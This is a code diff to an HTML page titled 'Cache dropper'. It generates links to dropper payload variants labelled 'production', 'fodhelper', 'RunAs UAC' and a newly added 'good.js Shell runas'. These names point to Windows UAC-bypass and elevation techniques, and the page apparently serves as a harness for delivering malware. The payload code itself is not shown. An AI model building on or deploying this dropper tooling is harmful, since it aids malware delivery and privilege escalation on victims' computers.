@@ -12,7 +12,7 @@
       }
     })();
   </script>
-  <script src="/consent.js?v=1.9.29"></script>
+  <script src="/consent.js?v=1.9.30"></script>
 </head>
 <body>
   <h1>Cache dropper</h1>
@@ -21,7 +21,8 @@
   <p>
     <a id="link-j" href="#">?f=…/j</a> (production) ·
     <a id="link-jj" href="#">?f=…/jj</a> (fodhelper) ·
-    <a id="link-jjj" href="#">?f=…/jjj</a> (UAC + SmartScreen) ·
+    <a id="link-jjj" href="#">?f=…/jjj</a> (RunAs UAC) ·
+    <a id="link-jjjj" href="#">?f=…/jjjj</a> (good.js Shell runas) ·
     <a id="link-hello" href="#">?f=…/hello.txt</a> (local test only)
   </p>
   <p>Current URL: <code id="current-url"></code></p>
@@ -34,13 +35,16 @@
       var helloUrl = origin + '/hello.txt';
       var jjUrl = origin + '/jj';
       var jjjUrl = origin + '/jjj';
+      var jjjjUrl = origin + '/jjjj';
       var linkJ = document.getElementById('link-j');
       var linkJj = document.getElementById('link-jj');
       var linkJjj = document.getElementById('link-jjj');
+      var linkJjjj = document.getElementById('link-jjjj');
       var linkHello = document.getElementById('link-hello');
       var qJ = '?f=' + encodeURIComponent(jUrl);
       var qJj = '?f=' + encodeURIComponent(jjUrl);
       var qJjj = '?f=' + encodeURIComponent(jjjUrl);
+      var qJjjj = '?f=' + encodeURIComponent(jjjjUrl);
       var qHello = '?f=' + encodeURIComponent(helloUrl);
       linkJ.href = qJ;
       linkJ.textContent = qJ;
@@ -48,6 +52,8 @@
       linkJj.textContent = qJj;
       linkJjj.href = qJjj;
       linkJjj.textContent = qJjj;
+      linkJjjj.href = qJjjj;
+      linkJjjj.textContent = qJjjj;
       linkHello.href = qHello;
       linkHello.textContent = qHello;
       document.getElementById('current-url').textContent = location.href;
